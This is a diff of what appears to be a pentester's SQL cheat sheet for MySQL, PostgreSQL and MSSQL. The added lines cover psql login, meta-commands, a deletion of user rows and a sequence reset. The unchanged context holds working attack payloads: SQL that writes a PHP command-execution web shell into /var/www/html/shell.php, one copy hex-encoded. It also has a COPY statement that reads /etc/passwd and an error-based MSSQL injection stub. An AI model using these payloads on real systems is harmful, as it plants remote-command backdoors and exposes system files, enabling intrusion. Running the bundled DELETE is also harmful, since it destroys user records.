@@ -12,6 +12,7 @@ select table_schema from information_schema.tables group by table_schema;
 
 # mysql tables for database
 select table_name from information_schema.tables where table_schema = '<DB>';
+\dt;
 
 # mysql columns for table
 select column_name, data_type from information_schema.columns where table_schema = '<DB>' and table_name = '<TABLE>';
@@ -32,6 +33,9 @@ echo -n '<?php passthru($_GET["cmd"]); ?>' | xxd -ps
 3c3f70687020706173737468727528245f4745545b22636d64225d293b203f3e
 SELECT 0x3c3f70687020706173737468727528245f4745545b22636d64225d293b203f3e INTO OUTFILE "/var/www/html/shell.php"
 SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';
+
+# postgres cli
+PGPASSWORD=<PASS> psql -U <PGUSER> <PGDB> -h localhost
 
 # postgres current user
 select current_user;
@@ -54,6 +58,16 @@ select pg_ls_dir('./');
 CREATE TABLE temp(data TEXT);
 COPY temp FROM '/etc/passwd';
 SELECT * FROM temp limit 1 offset 0;
+
+# postgres list object files
+\dl list object files
+
+# delete records from user tables clean
+delete from users where id in (9,10,11,12);
+-- Find the name of the sequence
+SELECT pg_get_serial_sequence('users', 'id');
+-- Reset the sequence
+SELECT setval('users_id_seq', (SELECT COUNT(id) FROM users));
 
 # mssql error
 For integer inputs : convert(int,@@version)
